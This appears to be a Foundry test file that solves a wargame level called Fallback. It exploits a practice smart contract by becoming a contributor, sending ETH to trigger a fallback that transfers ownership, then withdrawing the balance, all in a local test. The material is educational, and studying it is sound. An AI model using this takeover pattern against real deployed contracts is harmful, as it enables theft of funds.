                /****************************************************************
                 * Exploit Steps:
                * 1. Become a contributor by sending some ETH via contribute()
                * 2. Send ETH directly to trigger the vulnerable fallback function
                * 3. Verify we've become the owner
                * 4. Withdraw funds to prove complete control
                ****************************************************************/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {Fallback} from "../src/Fallback.sol";
import {console} from "forge-std/console.sol";

contract FallbackTest is Test{
        
        Fallback public  FallbackContract; //Instance of the contract
        address public attacker = (address(0x1234));  //attacker address
        address public owner = (address(0x5678)); //owner address

        function setUp() public{

                // give attacker 1 ether to contribute
                vm.deal(attacker, 1 ether);

                //Deploy the contract with the owner address
                vm.startPrank(owner);
                FallbackContract = new Fallback();
                vm.stopPrank();
        }

        function testTakeOwnership() public{
                
        vm.startPrank(attacker);

        // ===== PHASE 1: Become a contributor =====
        // The contract requires contributors to have sent some ETH
        FallbackContract.contribute{value: 1 wei}();

        // ===== PHASE 2: Trigger the fallback function =====
        (bool success,) = address(FallbackContract).call{value: 1 wei}("");
        require(success, "Fali to trigger the fallback function");

        // ===== PHASE 3: Verify ownership takeover =====
        assertEq(FallbackContract.owner(), attacker , "Attacker should be the new owner");
        console.log("Current owner:", FallbackContract.owner());

        // ===== PHASE 4: Withdraw funds =====
        uint256 initialBalance = attacker.balance;
        console.log("Attacker initial balance:", initialBalance);
        console.log("Contract balance:", address(FallbackContract).balance);

        FallbackContract.withdraw();

        console.log("Attacker new balance:", attacker.balance);
        console.log("Contract new balance:", address(FallbackContract).balance);

        assertGt(attacker.balance, initialBalance, "Attacker should have withdrawn funds");

        vm.stopPrank();
        }
}